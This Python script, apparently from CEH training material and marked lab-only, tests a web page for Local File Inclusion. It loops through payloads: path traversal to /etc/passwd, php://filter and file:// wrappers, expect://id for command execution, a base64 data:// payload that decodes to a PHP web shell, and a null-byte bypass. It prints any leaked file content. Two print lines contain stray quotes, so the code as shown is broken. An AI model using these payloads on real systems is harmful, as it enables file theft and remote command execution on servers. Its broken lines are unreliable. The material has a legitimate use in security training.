#!/usr/bin/env python3
# LAB-ONLY: Advanced LFI (Local File Inclusion) Tester
# CEH v13 Master Module 14
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
# DETAILED EXPLANATION: Tests various LFI bypasses (path traversal, wrappers, etc.)
import requests
import sys

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_TARGET_URL = "http://192.168.100.10/lfi.php?file="
LAB_TARGET_FILE = "/etc/passwd"
# -----------------------------------------------------------------------------------

def generate_lfi_payloads(target_file):
    payloads = []
    # Basic traversal
    payloads.append(target_file)
    for i in range(1,10):
        payloads.append("../"*i + target_file.lstrip('/'))
    # Wrappers
    payloads.append(f"php://filter/convert.base64-encode/resource={target_file}")
    payloads.append(f"php://filter/read=convert.base64-encode/resource={target_file}")
    payloads.append(f"file://{target_file}")
    payloads.append(f"expect://id")
    payloads.append(f"data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjIl0pOyA/Pg==")
    # Null byte bypass (old PHP)
    payloads.append(target_file + "%00")
    return payloads

def main():
    print("="*80)
    print("LAB-ONLY: Advanced LFI Tester")
    print("="*80")
    print(f"[*] Target: {LAB_TARGET_URL}")
    print("-"*80")
    for payload in generate_lfi_payloads(LAB_TARGET_FILE):
        try:
            resp = requests.get(f"{LAB_TARGET_URL}{payload}", timeout=5, verify=False)
            if resp.status_code ==200 and len(resp.text) >100:
                print(f"[+] Payload: {payload}")
                print(f"[+] Response: {resp.text[:300]}...")
        except Exception as e:
            pass

if __name__ == "__main__":
    if not any(prefix in LAB_TARGET_URL for prefix in ["10.", "172.16.", "172.17.", "172.18.", "172.19.", "172.20.", "172.21.", "172.22.", "172.23.", "172.24.", "172.25.", "172.26.", "172.27.", "172.28.", "172.29.", "172.30.", "172.31.", "192.168.", "localhost", "127.0.0.1"]):
        print("ERROR: LAB-ONLY! Use only private lab targets!")
        sys.exit(1)
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    main()
